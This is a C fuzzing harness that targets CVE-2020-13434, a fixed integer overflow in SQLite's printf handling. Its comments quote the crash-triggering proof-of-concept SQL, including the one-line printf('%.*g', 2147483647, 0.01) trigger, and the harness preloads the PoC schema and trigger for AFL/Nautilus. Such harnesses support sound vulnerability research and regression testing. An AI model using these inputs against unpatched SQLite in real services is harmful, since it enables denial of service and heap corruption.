/*
 * sqlite_harness_cve13434.c — CVE-2020-13434 targeted AFL harness
 *
 * CVE-2020-13434: Integer overflow in sqlite3_str_vappendf() in printf.c
 * Affects: SQLite since 3.8.3 (2014-02-03) through 3.32.0
 * Fixed:   SQLite 3.32.1 (2020-05-25)
 *
 * From the SQLite ticket (https://www.sqlite.org/src/info/23439ea582241138):
 *
 *   Full PoC (reported by finder):
 *     CREATE TABLE a(b DOUBLE CHECK( NOT CASE WHEN printf(b, b) THEN 0 END)
 *                    UNIQUE ON CONFLICT REPLACE);
 *     CREATE TRIGGER c INSERT ON a BEGIN
 *       INSERT INTO a SELECT group_concat(b, 2147483647) FROM a;
 *     END;
 *     INSERT INTO a(b, b, b) VALUES(NULL, 9, 3);
 *     UPDATE a SET b = 0;
 *     INSERT INTO a VALUES('GERMANY''s%'), ('Y'), ('Brand#23');
 *
 *   Simplified PoC (drh, 2020-05-23):
 *     SELECT printf('%.*g', 2147483647, 0.01);
 *
 * Root cause: printf() with %.*g and a large precision value (2147483647)
 * causes an integer overflow when computing the output buffer size in
 * sqlite3_str_vappendf(). The computed size wraps to a negative number,
 * leading to a heap buffer overflow (ASan) or UBSan signed integer overflow.
 *
 * This harness pre-loads the PoC schema so the fuzzer can trigger the
 * trigger+group_concat path without spending budget on DDL.
 *
 * Oracle:
 *   ASan crash  → exitcode 223  (ASAN_OPTIONS=exitcode=223)
 *   UBSan crash → exitcode 1    (UBSAN_OPTIONS=halt_on_error=1,exitcode=1)
 *   Signal      → detected by Nautilus forksrv
 *
 * Compile:
 *   make -f Makefile SQLITE=../cve_builds/sqlite-3.31.1/sqlite3.c \
 *        TARGET=sqlite_harness_cve13434_3311 \
 *        HARNESS=sqlite_harness_cve13434.c
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* SQLite amalgamation — path set by Makefile via -DSQLITE_HEADER=... */
#include SQLITE_HEADER

/* Stub AFL macros for standalone (non-AFL) oracle testing */
#ifndef __AFL_HAVE_MANUAL_CONTROL
#  define __AFL_INIT()       do {} while (0)
#  define __AFL_LOOP(n)      ((__afl_standalone_once--) > 0)
static volatile int __afl_standalone_once = 1;
#endif

/* ------------------------------------------------------------------
 * CVE-2020-13434 PoC schema
 *
 * Pre-loading table `a` + trigger `c` means the fuzzer only needs to
 * generate DML (INSERT/UPDATE) to hit the group_concat(b, 2147483647)
 * path inside the trigger. The trigger fires on INSERT INTO a, and
 * calls group_concat with a separator of 2147483647 bytes — that
 * large separator value is what overflows sqlite3_str_vappendf().
 *
 * We also keep the general schema (t1, t2, t3, fts, index, view)
 * so the fuzzer can explore non-CVE paths as well.
 * ------------------------------------------------------------------ */
static const char *SCHEMA_SQL =
    /* CVE-2020-13434 specific schema */
    "CREATE TABLE a("
    "  b DOUBLE"
    "  CHECK( NOT CASE WHEN printf(b, b) THEN 0 END)"
    "  UNIQUE ON CONFLICT REPLACE"
    ");"
    "CREATE TRIGGER c INSERT ON a BEGIN"
    "  INSERT INTO a SELECT group_concat(b, 2147483647) FROM a;"
    "END;"

    /* General schema for broader SQLite coverage */
    "CREATE TABLE t1(c1 INTEGER PRIMARY KEY, c2 TEXT, c3 REAL);"
    "CREATE TABLE t2(c1 INTEGER, c2 TEXT, c3 REAL);"
    "CREATE TABLE t3(c1 INTEGER, c2 TEXT NOT NULL, c3 REAL DEFAULT 0.0);"
    "INSERT INTO t1 VALUES(1,'hello',1.5),(2,'world',2.5),"
    "  (-1,'neg',-1.0),(0,'zero',0.0),"
    "  (9223372036854775807,'max',1e308);"
    "INSERT INTO t2 VALUES(1,'a',1.0),(2,'b',2.0),(3,'c',3.0);"
    "INSERT INTO t3(c1,c2,c3) VALUES(1,'x',0.1),(2,'y',0.2);"
    "CREATE VIRTUAL TABLE fts_t1 USING fts3(c1, c2);"
    "INSERT INTO fts_t1 VALUES('1','hello world');"
    "INSERT INTO fts_t1 VALUES('2','foo bar baz');"
    "CREATE INDEX idx_t1_c2 ON t1(c2);"
    "CREATE INDEX idx_t2_c1 ON t2(c1);"
    "CREATE VIEW v1 AS SELECT t1.c1, t1.c2, t2.c3"
    "  FROM t1 JOIN t2 ON t1.c1=t2.c1;";

static sqlite3 *db = NULL;

/* Called once before __AFL_INIT() — schema setup paid once per fork */
__attribute__((constructor))
static void setup_db(void) {
    int rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[cve13434] sqlite3_open failed: %s\n",
                sqlite3_errmsg(db));
        exit(1);
    }
    char *errmsg = NULL;
    rc = sqlite3_exec(db, SCHEMA_SQL, NULL, NULL, &errmsg);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[cve13434] schema setup failed: %s\n", errmsg);
        sqlite3_free(errmsg);
        exit(1);
    }
}

/* ------------------------------------------------------------------ */
static char *read_input(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > 1024 * 1024) { fclose(f); return NULL; }
    char *buf = malloc(sz + 1);
    if (!buf) { fclose(f); return NULL; }
    size_t n = fread(buf, 1, sz, f);
    fclose(f);
    buf[n] = '\0';
    *out_len = n;
    return buf;
}

/* ------------------------------------------------------------------ */
int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <input_file>\n", argv[0]);
        return 1;
    }

    __AFL_INIT();

    /* Run one SQL input per fork — Nautilus uses fork-server mode, not AFL
     * persistent mode, so each child must exit after one execution. */
    size_t sql_len = 0;
    char *sql = read_input(argv[1], &sql_len);
    if (sql) {
        char *errmsg = NULL;
        sqlite3_exec(db, sql, NULL, NULL, &errmsg);
        if (errmsg) sqlite3_free(errmsg);
        free(sql);
    }

    sqlite3_close(db);
    return 0;
}
